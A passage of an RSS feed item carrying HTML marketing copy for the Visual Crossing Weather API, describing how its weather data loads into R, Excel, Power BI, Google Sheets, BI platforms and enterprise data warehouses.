										</ul>
									</div>
								</div>
						</div>
						
						
						
					
						<p id="">
							<h2>Weather Data for Data Science</h2>
						</p>
						<div id="">
								
								
								<div>
									
									
									<div>
										<p>
											R has become an essential environment for statistical computing and data science.  
											It is widely used among analysts and data miners for developing statistical software and data analysis including weather. 
											Visual Crossing API can be used to load data into your R code quickly and easily.

										</p>
										<ul>
											<li><i></i>Load weather information with a single call</li>
											<li><i></i>Use R to calculate statistics, do analysis &amp; make graphics</li>
											<li><i></i>Build queries using the Query Builder page or in your code</li>
											<li><i></i>Join weather data with other business data</li>
											<li><i></i>Videos and tutorials show the process step-by-step</li>
										</ul>
									</div>

								</div>
						</div>
						

						<div id="">
								
								
								<div>
									
									
									<div>
										<p>
										
										Excel is used by corporate analysts and home users alike because it is powerful, intuitive. 
										It provides a simple weather analysis platform business and for students and data hobbyists.  
										Our unique CSV output mode allows the results of weather queries to be consumed directly in any Excel workbook.

										</p>
										<ul>
											<li><i></i>Load weather query results directly via an API URL</li>
											<li><i></i>Save and share your weather analysis</li>
											<li><i></i>Make and test queries using our Weather Query Builder</li>
											<li><i></i>Automatically update weather conditions via live queries within Excel</li>
											<li><i></i>Sample workbooks available to use directly and build upon</li>
										</ul>
									</div>

								</div>
						</div>
						
						<div id="">
								
								
								<div>
									
									
									<div>
										<p>
										
									Power BI is an interactive business intelligence tool designed to be simple enough for end users create their own analyses while being powerful enough for business-wide use.  
									Weather data fits naturally into this analysis framework, and Visual Crossing Weather makes the integration easy.  
									Our API query URLs can return CSV results that import directly into any Power BI report or dashboard.

										</p>
										<ul>
											<li><i></i>Find valuable correlations between any data and weather</li>
											<li><i></i>Load weather data directly from our cloud-based servers</li>
											<li><i></i>Save and share weather reports and dashboard across your team</li>
											<li><i></i>Samples get you up and running quickly</li>
										</ul>
									</div>

								</div>
						</div>
	

	
	

						<div id="">
								
								<p><a href="https://www.visualcrossing.com/resources/documentation/weather-api" title="Weather API Documentation">
									<img src="https://www.visualcrossing.com/images/excel-weather/bi_300x200.png" alt="Loading weather data into your Business Intelligence System"></a>
								</p>
								<div>
									
									
									<div>
									<p>
										High-end BI platforms represent the backbone of data analysis within many large and mid-sized companies.  
										These powerful tools can crunch decades of business and external data to find patterns and make recommendations.  
										Visual Crossing Weather can be easily embedded directly into every BI application.


										</p>
										<ul>
											<li><i></i>Find valuable correlations between your business data and weather</li>
											<li><i></i>ETL scripts, plug-ins, and sample dashboards available</li>
											<li><i></i>Import weather data into your corporate warehouse</li>
											<li><i></i>Get added value from your existing BI investment</li>
										</ul>
									</div>

								</div>
						</div>
						
						<div id="">
								
								
								<div>
									
									
									<div>
										<p>
											Google Sheets has become the most universally accessible data analysis application due to the global reach of its web-based platform.  
											That same web platform powers instant data sharing in schools, companies, and around the world.  
											Visual Crossing Weather data can be integrated easily into any Google Sheet application using a single API call.

										</p>
										<ul>
											<li><i></i>Directly load history and forecast weather data into any Sheet</li>
											<li><i></i>Update live weather results directly in Google Sheets</li>
											<li><i></i>Share weather data analysis instantly</li>
											<li><i></i>Ideal for academic and education users</li>
										</ul>
									</div>

								</div>
						</div>
						
	
						<p id="">
							<h2>Databases</h2>
						</p>
						<div id="">
								
								<p><a href="https://www.visualcrossing.com/weather/weather-data-services" title="Weather Data Query Builder"><img src="https://www.visualcrossing.com/images/excel-weather/server_300x200.png" alt="Weather Data for Databases - Data Loading, Live Updates, Enterprise Access"></a>
							
								</p>
								<div>
									
									
									<div>
										<p>
											An enterprise data warehouse is the heart of data science for nearly every large and mid-sized corporation.  
											The power to store vast amounts of business data enable analysts across an organization make intelligent business decisions.
											Visual Crossing Weather allows historical weather data to be matched directly to existing business records.
										</p>
										<p>											
											Many business activities are affected by weather.
											Adding Visual Crossing data to an enterprise data warehouse bring immediate inside and ROI.
										</p>
										<ul>
											<li><i></i>Easily load weather data using ETL and embedded queries</li>
											<li><i></i>Dynamic queries load fresh weather data automatically</li>
											<li><i></i>Compatible with application across the enterprise</li>
											<li><i></i>Every part of the organization can find new insight</li>
										</ul>
									</div>

								</div>
						</div>
						
					</div></div>]]>
            </description>
            <link>https://www.visualcrossing.com/weather-api</link>
            <guid isPermaLink="false">hacker-news-small-sites-25706592</guid>
            <pubDate>Sun, 10 Jan 2021 00:05:56 GMT</pubDate>
        </item>
    </channel>
</rss>
